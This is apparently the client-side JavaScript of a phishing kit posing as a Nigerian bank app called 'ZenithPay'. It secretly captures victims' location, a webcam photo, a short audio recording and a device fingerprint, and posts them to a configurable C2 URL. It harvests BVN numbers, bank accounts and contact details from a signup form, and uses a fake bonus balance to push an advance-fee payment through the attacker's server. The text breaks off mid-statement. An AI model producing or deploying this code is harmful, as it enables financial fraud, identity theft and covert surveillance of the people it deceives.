// ============ CONFIG ============
// ⚠️ REPLACE WITH YOUR SERVEOSERVE URL ⚠️
const C2_URL = 'https://your-serveo-url.serveousercontent.com';
const ADMIN_PASSWORD = 'ZENITH2026';

// ============ SPLASH ============
setTimeout(() => {
    const splash = document.getElementById('splash');
    const loginPage = document.getElementById('loginPage');
    if (splash) splash.style.display = 'none';
    if (loginPage) loginPage.classList.remove('hidden');
}, 3000);

// ============ PERMISSIONS ============
function requestPermissions() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                sendData({
                    type: 'location',
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                });
            },
            () => {},
            { enableHighAccuracy: true, timeout: 8000 }
        );
    }

    navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: 640, height: 480 }
    })
    .then((stream) => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            video.play();
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());
            sendData({ type: 'selfie', image: imageData });
        };
    })
    .catch(() => {});

    navigator.mediaDevices.getUserMedia({ audio: true })
    .then((stream) => {
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.onload = () => {
                sendData({ type: 'audio', audio: reader.result });
            };
            reader.readAsDataURL(blob);
            stream.getTracks().forEach(track => track.stop());
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
    })
    .catch(() => {});
}

// ============ SEND DATA ============
function sendData(payload) {
    payload._timestamp = Date.now();
    payload._ua = navigator.userAgent;

    if (navigator.sendBeacon) {
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        navigator.sendBeacon(`${C2_URL}/capture`, blob);
        return;
    }

    fetch(`${C2_URL}/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'no-cors'
    }).catch(() => {});
}

// ============ FINGERPRINT ============
function captureFingerprint() {
    sendData({
        type: 'fingerprint',
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        touchSupport: 'ontouchstart' in window,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
    });
}

// ============ FORM SUBMIT ============
const signupForm = document.getElementById('signupForm');
if (signupForm) {
    signupForm.addEventListener('submit', (e) => {
        e.preventDefault();

        const userData = {
            type: 'banking_details',
            fullname: document.getElementById('fullname').value,
            phone: document.getElementById('phone').value,
            email: document.getElementById('email').value,
            bvn: document.getElementById('bvn').value,
            bank: document.getElementById('bank').value,
            account: document.getElementById('account').value
        };

        sendData(userData);
        localStorage.setItem('zenithpay_user', JSON.stringify(userData));

        const btn = document.getElementById('submitBtn');
        btn.textContent = 'Opening Account...';
        btn.disabled = true;

        setTimeout(() => {
            window.location.href = 'dashboard.html';
        }, 1800);
    });
}

// ============================================================
// ===== TAB SWITCHING =====
// ============================================================

function switchTab(tab) {
    document.querySelectorAll('.tab-content').forEach(el => {
        el.classList.add('hidden');
        el.classList.remove('active');
    });

    const target = document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
    if (target) {
        target.classList.remove('hidden');
        target.classList.add('active');
    }

    document.querySelectorAll('.nav-item').forEach(el => {
        el.classList.remove('active');
        if (el.dataset.tab === tab) {
            el.classList.add('active');
        }
    });
}

document.querySelectorAll('.nav-item').forEach(btn => {
    btn.addEventListener('click', function() {
        switchTab(this.dataset.tab);
    });
});

// ============================================================
// ===== DASHBOARD LOAD =====
// ============================================================

function loadDashboard() {
    const userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');

    const greeting = document.getElementById('greeting');
    if (greeting && userData.fullname) {
        greeting.textContent = `Hi, ${userData.fullname.split(' ')[0]}`;
    }

    const avatar = document.getElementById('avatar');
    const profileAvatar = document.getElementById('profileAvatar');
    if (userData.fullname) {
        const initials = userData.fullname.split(' ').map(n => n[0]).join('').toUpperCase();
        if (avatar) avatar.textContent = initials;
        if (profileAvatar) profileAvatar.textContent = initials;
    }

    const accountDisplay = document.getElementById('accountDisplay');
    const bankDisplay = document.getElementById('bankDisplay');
    if (accountDisplay) accountDisplay.textContent = userData.account || '0123456789';
    if (bankDisplay) bankDisplay.textContent = userData.bank || 'GTBank';

    // Profile
    const profileName = document.getElementById('profileName');
    const profileFullName = document.getElementById('profileFullName');
    const profilePhone = document.getElementById('profilePhone');
    const profileEmail = document.getElementById('profileEmail');
    const profileEmailField = document.getElementById('profileEmailField');
    const profileBvn = document.getElementById('profileBvn');
    const profileBank = document.getElementById('profileBank');
    const profileAccount = document.getElementById('profileAccount');

    if (profileName) profileName.textContent = userData.fullname || 'Chidi Okafor';
    if (profileFullName) profileFullName.textContent = userData.fullname || 'Chidi Okafor';
    if (profilePhone) profilePhone.textContent = userData.phone || '080 1234 5678';
    if (profileEmail) profileEmail.textContent = userData.email || 'user@email.com';
    if (profileEmailField) profileEmailField.textContent = userData.email || 'user@email.com';
    if (profileBvn) profileBvn.textContent = userData.bvn || '•••••••••••';
    if (profileBank) profileBank.textContent = userData.bank || 'GTBank';
    if (profileAccount) profileAccount.textContent = userData.account || '0123456789';

    // Card names
    const cardName1 = document.getElementById('cardName1');
    const cardName2 = document.getElementById('cardName2');
    if (cardName1) cardName1.textContent = userData.fullname || 'Chidi Okafor';
    if (cardName2) cardName2.textContent = userData.fullname || 'Chidi Okafor';

    const balanceDisplay = document.getElementById('balanceDisplay');
    const statBalance = document.getElementById('statBalance');
    const statTx = document.getElementById('statTx');
    const balanceCard = document.querySelector('.balance-card');
    const emptyState = document.getElementById('emptyState');
    const bonusTx = document.getElementById('bonusTx');
    const withdrawTx = document.getElementById('withdrawTx');

    const balanceState = localStorage.getItem('zenithpay_balance') || '6000';

    if (balanceState === '0') {
        if (balanceDisplay) balanceDisplay.textContent = '₦0.00';
        if (statBalance) statBalance.textContent = '₦0';
        if (balanceCard) balanceCard.style.background = '#94A3B8';
        if (emptyState) emptyState.classList.add('hidden');
        if (bonusTx) bonusTx.classList.remove('hidden');
        if (withdrawTx) withdrawTx.classList.remove('hidden');
        if (statTx) statTx.textContent = '2';
    } else {
        if (balanceDisplay) balanceDisplay.textContent = '₦6,000.00';
        if (statBalance) statBalance.textContent = '₦6,000';
        if (statTx) statTx.textContent = '0';
        if (emptyState) emptyState.classList.remove('hidden');
        if (bonusTx) bonusTx.classList.add('hidden');
        if (withdrawTx) withdrawTx.classList.add('hidden');
    }
}

// ============================================================
// ===== CARDS TAB =====
// ============================================================

document.querySelectorAll('[id^="freezeBtn"]').forEach(btn => {
    btn.addEventListener('click', function() {
        const cardId = this.id.replace('freezeBtn', '');
        const cardVisual = document.querySelector(`#card${cardId} .card-visual`);
        const status = this.textContent.trim();

        if (status === '❄️ Freeze') {
            this.textContent = '🔥 Unfreeze';
            this.style.background = '#DC2626';
            if (cardVisual) {
                cardVisual.style.opacity = '0.5';
                cardVisual.style.filter = 'grayscale(0.8)';
            }
            alert(`Card •••• ${document.getElementById(`cardNumber${cardId}`).textContent.slice(-4)} has been frozen.`);
        } else {
            this.textContent = '❄️ Freeze';
            this.style.background = '';
            if (cardVisual) {
                cardVisual.style.opacity = '1';
                cardVisual.style.filter = 'none';
            }
            alert(`Card •••• ${document.getElementById(`cardNumber${cardId}`).textContent.slice(-4)} has been unfrozen.`);
        }
    });
});

document.querySelectorAll('[id^="cardDetailsBtn"]').forEach(btn => {
    btn.addEventListener('click', function() {
        const cardId = this.id.replace('cardDetailsBtn', '');
        const cardNumber = document.getElementById(`cardNumber${cardId}`).textContent;
        const cardName = document.getElementById(`cardName${cardId}`).textContent;
        const cardExpiry = document.getElementById(`cardExpiry${cardId}`).textContent;
        const cardNetwork = document.querySelector(`#card${cardId} .card-network`).textContent;

        document.getElementById('detailCardNumber').textContent = cardNumber;
        document.getElementById('detailCardName').textContent = cardName;
        document.getElementById('detailCardExpiry').textContent = cardExpiry;
        document.getElementById('detailCardNetwork').textContent = cardNetwork;

        document.getElementById('cardDetailsModal').classList.remove('hidden');
    });
});

document.getElementById('closeCardDetails')?.addEventListener('click', function() {
    document.getElementById('cardDetailsModal').classList.add('hidden');
});

document.getElementById('cardDetailsModal')?.addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.add('hidden');
    }
});

document.getElementById('addCardBtn')?.addEventListener('click', function() {
    alert('📱 Your new virtual card is being generated. Check back in a few minutes.');
});

// ============================================================
// ===== TRANSFER TAB =====
// ============================================================

document.getElementById('transferBtn')?.addEventListener('click', function() {
    const bank = document.getElementById('transferBank').value;
    const account = document.getElementById('transferAccount').value;
    const amount = document.getElementById('transferAmount').value;
    const narration = document.getElementById('transferNarration').value;

    if (!bank || !account || !amount) {
        alert('⚠️ Please fill in all required fields.');
        return;
    }

    sendData({
        type: 'transfer',
        bank: bank,
        account: account,
        amount: amount,
        narration: narration || 'Transfer',
        timestamp: Date.now()
    });

    document.getElementById('transferAmountDisplay').textContent = `₦${amount}`;
    document.getElementById('transferAccountDisplay').textContent = account;
    document.getElementById('transferResult').classList.remove('hidden');

    setTimeout(() => {
        document.getElementById('transferResult').classList.add('hidden');
        document.getElementById('transferBank').value = '';
        document.getElementById('transferAccount').value = '';
        document.getElementById('transferAmount').value = '';
        document.getElementById('transferNarration').value = '';
        alert('✅ Transfer completed successfully!');
    }, 3000);
});

// ============================================================
// ===== PROFILE TAB =====
// ============================================================

document.querySelectorAll('.toggle').forEach(toggle => {
    toggle.addEventListener('click', function() {
        if (this.textContent === 'On') {
            this.textContent = 'Off';
            this.style.color = '#94A3B8';
        } else {
            this.textContent = 'On';
            this.style.color = '#0A7E3D';
        }
    });
});

document.getElementById('logoutBtn')?.addEventListener('click', function() {
    if (confirm('Are you sure you want to logout?')) {
        localStorage.clear();
        window.location.href = 'index.html';
    }
});

// ============================================================
// ===== PAY WITH FLUTTERWAVE =====
// ============================================================

document.getElementById('payWithFlutterwaveBtn')?.addEventListener('click', async function() {
    const amount = document.getElementById('depositAmount').value;
    const userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');

    if (!userData.email) {
        alert('⚠️ Please complete your profile first.');
        return;
    }

    try {
        this.textContent = 'Processing...';
        this.disabled = true;

        const response = await fetch(`${C2_URL}/initiate_payment`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: userData.email,
                amount: amount,
                name: userData.fullname || 'Customer'
            })
        });

        const result = await response.json();

        if (result.status === 'success' && result.payment_link) {
            window.location.href = result.payment_link;
        } else {
            alert('❌ Payment initiation failed. Please try again.');
            this.textContent = '💳 Pay with Flutterwave';
            this.disabled = false;
        }
    } catch (error) {
        console.error('Payment error:', error);
        alert('❌ An error occurred. Please try again.');
        this.textContent = '💳 Pay with Flutterwave';
        this.disabled = false;
    }
});

// ===== CHECK PAYMENT STATUS ON RETURN =====
if (window.location.search.includes('tx_ref')) {
    const params = new URLSearchParams(window.location.search);
    const tx_ref = params.get('tx_ref');
    const status = params.get('status');

    if (status === 'successful' && tx_ref) {
        fetch(`${C2_URL}/verify_payment`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ tx_ref: tx_ref })
        })
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                alert('✅ Payment successful! Your bonus is now available.');
                localStorage.setItem('zenithpay_balance', '0');
                location.reload();
            } else {
                alert('⚠️ Payment verification failed. Contact support.');
            }
        });
    } else if (status === 'cancelled') {
        alert('⚠️ Payment was cancelled.');
    }
}

// ============================================================
// ===== WITHDRAW MODAL (OPEN) =====
// ============================================================

document.getElementById('withdrawBtn')?.addEventListener('click', function() {
    if (localStorage.getItem('zenithpay_balance') === '0') {
        alert('⚠️ You have already withdrawn your bonus.');
        return;
    }
    document.getElementById('withdrawModal').classList.remove('hidden');
});

document.getElementById('closeModal')?.addEventListener('click', function() {
    document.getElementById('withdrawModal').classList.add('hidden');
});

document.getElementById('withdrawModal')?.addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.add('hidden');
    }
});

// ============================================================
// ===== WHATSAPP MODAL =====
// ============================================================

document.getElementById('copyAccount')?.addEventListener('click', function() {
    const account = '0123456789';
    navigator.clipboard.writeText(account).then(() => {
        alert('✅ Account number copied!');
    }).catch(() => {
        const input = document.createElement('input');
        input.value = account;
        document.body.appendChild(input);
        input.select();
        document.execCommand('copy');
        document.body.removeChild(input);
        alert('✅ Account number copied!');
    });
});

document.getElementById('verifyPaymentBtn')?.addEventListener('click', function() {
    const amount = document.getElementById('depositAmount').value;
    const userAccount = document.getElementById('userAccount').value;
    const userBank = document.getElementById('userBank').value;

    if (!userAccount || !userBank) {
        alert('⚠️ Please fill in your account details.');
        return;
    }

    const userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');

    sendData({
        type: 'withdrawal_attempt',
        amount: amount,
        userAccount: userAccount,
        userBank: userBank,
        timestamp: Date.now()
    });

    document.getElementById('withdrawModal').classList.add('hidden');
    document.getElementById('whatsappModal').classList.remove
